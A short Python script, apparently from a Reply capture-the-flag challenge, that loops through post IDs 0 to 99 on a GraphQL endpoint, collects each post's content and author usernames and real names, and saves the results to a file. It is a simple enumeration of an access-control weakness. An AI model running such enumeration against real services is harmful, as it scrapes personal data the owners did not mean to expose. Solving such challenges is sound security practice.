import requests

result = ''

for i in range(100):
    result+=f"\n\nID: {i}\n"
    r = requests.get('http://gamebox1.reply.it/a37881ac48f4f21d0fb67607d6066ef7/graphql?query={%0A%09post(id%3A'+str(i)+'){%0A%20%20%20%20title%2C%0A%20%20%20%20content%2C%0A%20%20%20%20author{%0A%20%20%20%20%20%20username%2C%0A%20%20%20%20%20%20firstName%2C%0A%20%20%20%20%20%20lastName%0A%20%20%20%20}%0A%20%20}%0A}')
    if not "uselesesstext" in r.text:
        result+=r.text
    else:
        result+="USELESS"


with open('result.txt', 'w') as f:
    f.write(result)